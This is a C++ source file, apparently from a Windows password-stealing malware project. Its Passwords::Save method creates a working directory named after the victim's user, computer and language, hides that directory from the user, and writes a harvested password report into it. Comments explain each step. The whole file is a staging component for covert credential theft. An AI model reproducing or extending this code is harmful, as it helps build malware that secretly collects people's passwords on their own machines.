#include "Passwords.h"
#include "Filemanager.h"
#include "Paths.h"
#include "SystemInfo.h"
#include "Report.h"
#include <Windows.h>
#include <iostream>

// Define a static string variable for the password store directory.
// The directory name is constructed using the user's name, the computer's name, and the system's language.
std::string Passwords::PasswordsStoreDirectory = SystemInfo::getUserName() + "@" + SystemInfo::getComputerName() + "_" + SystemInfo::getLanguage();

// Define a string for the report path by concatenating the initialized working directory and the password store directory.
std::string Reportpath = Paths::InitWorkDir() + "\\" + Passwords::PasswordsStoreDirectory;

// Define a method for saving password data, likely storing reports in a specified directory.
std::string Passwords::Save()
{
    // Variable for the return value of the directory creation calls (usually 0 for failure, non-zero for success).
    int nRet;

    // Check if the working directory (init directory) exists.
    // INVALID_FILE_ATTRIBUTES indicates that the directory doesn't exist.
    if (INVALID_FILE_ATTRIBUTES == GetFileAttributesA(Paths::InitWorkDir().c_str()))
    {
        // If the directory does not exist, create the directory for working files.
        nRet = CreateDirectoryA(Paths::InitWorkDir().c_str(), NULL);

        // Create the subdirectory for storing passwords (the report directory).
        nRet = CreateDirectoryA(Reportpath.c_str(), NULL);

        // Call a function to hide the working directory from the file system (likely making it invisible to the user).
        Paths::HideFile(Paths::InitWorkDir().c_str());
    }
    else
    {
        // If the directory already exists, delete it and its contents (if any).
        Filemanager::DeleteFileOrDir(Paths::InitWorkDir().c_str());

        // Remove the directory itself.
        RemoveDirectory(Paths::InitWorkDir().c_str());

        // Recreate the working directory and the subdirectory for storing passwords.
        nRet = CreateDirectoryA(Paths::InitWorkDir().c_str(), NULL);
        nRet = CreateDirectoryA(Reportpath.c_str(), NULL);

        // Again, hide the working directory from the file system.
        Paths::HideFile(Paths::InitWorkDir().c_str());
    }

    // Call the Report::CreateReport method to generate the report and save it in the specified report directory.
    Report::CreateReport(Reportpath);

    // Return the path where the report has been saved.
    return Reportpath;
}
